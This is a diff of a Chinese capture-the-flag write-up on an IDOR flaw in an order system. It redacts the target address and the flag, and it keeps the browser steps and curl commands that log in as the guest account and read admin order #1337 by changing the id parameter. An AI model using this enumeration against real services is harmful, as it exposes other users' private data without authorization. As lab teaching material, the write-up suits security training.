@@ -1,6 +1,6 @@
 # 30 · IDOR 水平越权（订单系统）
 
-> 靶机: `http://47.120.76.57:34938`　预置账号: `guest` / `guest123`
+> 靶机: `http://目标地址`　预置账号: `guest` / `guest123`
 > Flag 位置: admin 的订单 `#1337` 备注字段
 
 ## 漏洞一句话
@@ -12,7 +12,7 @@
 ### Step 1. 打开靶机，访问 `/login`
 
 ```
-http://47.120.76.57:34938/login
+http://目标地址/login
 ```
 
 页面 input 的 `placeholder` 直接写着 `guest` / `guest123`（题目送的凭据）。
@@ -24,7 +24,7 @@ http://47.120.76.57:34938/login
 ### Step 3. 看自己的订单列表
 
 ```
-http://47.120.76.57:34938/
+http://目标地址/
 ```
 
 只看到自己的 `#1001`、`#1002` 等订单，页脚提示：
@@ -38,7 +38,7 @@ http://47.120.76.57:34938/
 地址栏直接改：
 
 ```
-http://47.120.76.57:34938/order?id=1003
+http://目标地址/order?id=1003
 ```
 
 返回 `alice` 的笔记本订单——**越权确认**。
@@ -46,7 +46,7 @@ http://47.120.76.57:34938/order?id=1003
 ### Step 5. 直奔 admin 订单 #1337
 
 ```
-http://47.120.76.57:34938/order?id=1337
+http://目标地址/order?id=1337
 ```
 
 响应：
@@ -56,7 +56,7 @@ http://47.120.76.57:34938/order?id=1337
 下单人: admin
 商品: # 机密物料 #
 金额: ¥0.01
-备注: TOGOGO-flag{1c25b726-1cf9-44e8-8e34-7cf89e70e5bf}
+备注: TOGOGO-flag{}
 ```
 
 ## 命令行复刻（curl 版）
@@ -64,10 +64,10 @@ http://47.120.76.57:34938/order?id=1337
 ```bash
 # 1. 登录并保存 cookie
 curl -c /tmp/q30.ck -d 'username=guest&password=guest123' \
-  http://47.120.76.57:34938/login
+  http://目标地址/login
 
 # 2. 越权读 admin 订单
-curl -b /tmp/q30.ck "http://47.120.76.57:34938/order?id=1337"
+curl -b /tmp/q30.ck "http://目标地址/order?id=1337"
 ```
 
 ## 一键脚本
@@ -100,7 +100,7 @@ if (!$o || $o['user'] !== $_SESSION['user']) {
 ## 拿到的 FLAG
 
 ```
-TOGOGO-flag{1c25b726-1cf9-44e8-8e34-7cf89e70e5bf}
+TOGOGO-flag{}
 ```
 
 ## 知识点速记
